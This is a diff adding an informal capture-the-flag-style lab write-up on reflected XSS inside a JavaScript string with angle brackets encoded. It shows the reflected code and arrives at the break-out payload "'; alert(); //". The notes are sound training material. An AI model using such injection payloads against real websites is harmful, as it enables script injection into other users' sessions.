@@ -1,0 +1,22 @@
+LAB INFO: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+MORE INFO: This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
+
+
+ANALYSIS: 
+1. This is  a reflected xss so we are passing a string "123456" into the search function.
+2. Seeing that the string is shown where from web developer tool:
+   2.1 <h1>0 search results for '123456'</h1>
+   2.2  var searchTerms = '123456';
+                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+    2.3   <img src="/resources/images/tracker.gif?searchTerms=123456">
+
+3. So, lets analyze 2.2 hai ta, 
+   3.1 var searchTerms='123456'; ==> normally call alert only inplace of '12345' let's see what happen
+   3.2 To call alert I have to be out of the quote('') 
+   3.3 So, lets try to be out of it hai
+   3.4 var searchTerms=''alert()//';
+      3.4.1 so my payload is: ' alert()//
+      3.4.2  var searchTerms = '' alert()//'; ==> This gives as like this: ==> so this not works because we are not escaping that semicolon yet
+      3.4.3 so our final payload would looks like: '; alert(); //
+      3.4.4  In search terms this shows like: var searchTerms= ''; alert(1);//';
